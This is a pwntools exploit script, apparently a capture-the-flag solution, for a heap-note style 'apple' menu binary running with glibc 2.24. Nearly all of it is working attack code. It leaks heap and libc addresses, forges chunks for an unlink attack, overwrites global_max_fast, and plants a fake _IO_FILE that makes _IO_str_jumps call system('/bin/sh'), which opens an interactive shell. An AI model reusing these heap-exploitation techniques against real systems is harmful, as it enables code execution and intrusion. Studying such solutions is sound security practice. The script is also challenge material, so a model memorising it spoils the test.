from pwn import*
context.log_level ='DEBUG'
def new(size,content,sign=0):
	p.sendlineafter('your choice:','1')
	p.sendlineafter('color?(0:red, 1:green):','0')
	p.sendlineafter('value?(0-999):','0')
	p.sendlineafter('num?(0-16):','0')
	p.sendlineafter('description length?(1-1024):',str(size))
	if sign == 1:
		return
	p.sendafter('description of the apple:',content)
def free(index):
	p.sendlineafter('your choice:','2')
	p.sendlineafter('which?(0-15):',str(index))
def edit(index,content):
	p.sendlineafter('your choice:','3')
	p.sendlineafter('which?(0-15):',str(index))
	p.sendlineafter('color?(0:red, 1:green):','2')
	p.sendlineafter('value?(0-999):','1000')
	p.sendlineafter('num?(0-16):','17')
	p.sendafter('description of the apple:',content)
def show(index):
	p.sendlineafter('your choice:','4')
	p.sendlineafter('which?(0-15):',str(index))
p = process('./main')
libc = ELF('./libc-2.24.so',checksec=False)
new(0x3F0,'FMYY\n')
new(0xD8 ,'FMYY\n')
new(0x3F0,'FMYY\n')
new(0xD8 ,'FMYY\n')
free(2)
free(0)
new(0x400,'FMYY\n')
show(2)
p.recvuntil('description:')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x510
log.info('HEAP:\t' + hex(heap_base))
#clear all chunks
free(0)
free(3)
free(1)
free(0) #here I just want to free all chunks so that I can layout the new structure once again
#-------------------
unlink = heap_base + 0x28
P = heap_base + 0xB60

new(0x10,p64(P) + '\n')
new(0xD8,'FMYY\n')
new(0x3F0,'FMYY\n')
new(0xD8,'FMYY\n')
new(0x3E0,'FMYY\n')
new(0xD8,'FMYY\n')
new(0xD8,p64(0x411) + p64(unlink -0x18) + p64(unlink -0x10) + p64(0)*2 + '\n')
new(0x1D8,'FMYY\n')
new(0x98  ,'FMYY\n')
new(0x1D8,p64(0)*9 + p64(0x410) + p64(0x20) + p64(0)*2 + p64(0) + p64(0x21)  + '\n')
new(0x400,'FMYY\n')
new(0x400,'FMYY\n')
new(0x400,'FMYY\n')
new(0x2A0,'FMYY\n')
new(0x128,p64(0) + p64(0x1410) + p64(0x21) + p64(0)*2 + p64(0) + p64(0x21) + '\n')
free(0)
free(2)
free(4)
new(0x400,'FMYY\n')
edit(4,p64(P) + '\n')
free(9)
free(7)
new(0x3F0,'U'*24*8 + p32(0xDEADBEEF)*2 + '\n') #So far,we have get the fake_chunk ,and the index is 2
new(0x1D8,'FMYY\n')
edit(4,p64(heap_base + 0x130) + '\n') #fix the large bins
show(2)
p.recvuntil('\xEF\xBE\xAD\xDE'*2)
libc_base=u64(p.recv(6).ljust(8,'\x00')) -584 - 0x10 -libc.sym['__malloc_hook']
libc.address = libc_base
IO_list_all = libc.sym['_IO_list_all']
system = libc.sym['system']
binsh = libc.search('/bin/sh').next()
IO_str_jumps =libc_base + 0x3BE4C0
Global_max_fast = libc_base + 0x3C37D0
log.info('LIBC:\t' + hex(libc_base))
edit(2,'\x00'*24*8 + p64(0X201) + p64(584 + 0x10 + libc.sym['__malloc_hook'])*2+ '\n')
new(0x1D8,'FMYY\n') #7
free(7)
edit(2,'\x00'*24*8 + p64(0x201) + p64(libc.sym['__malloc_hook'] + 0x10 + 88) + p64(Global_max_fast -0x10) + '\n')
new(0x1D8,'FMYY\n')
fake_IO_FILE = p64(0)*4
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(binsh)
fake_IO_FILE  =fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8)
fake_IO_FILE += p64(0) + p64(system)
edit(2,'\x00'*24*8 + p64(0x1411) + fake_IO_FILE[0x10:] + '\n')
free(7)
new(0x300,'FMYY\n',sign=1)
#--------------

p.interactive()

'''
00000000 apple           struct; (sizeof=0x20)
00000000 color_choice    dd
00000004 num             dd
00000008 value           dq
00000010 index           dd
00000014 pad             dd
00000018 description     dq
00000020 apple           ends
#----------------
00000000 apple_manage    struct; (sizeof=0x10)
00000000 inuse           dd
00000004 size            dd
00000008 apple_ptr       dq                    ; offset
00000010 apple_manage    ends
'''
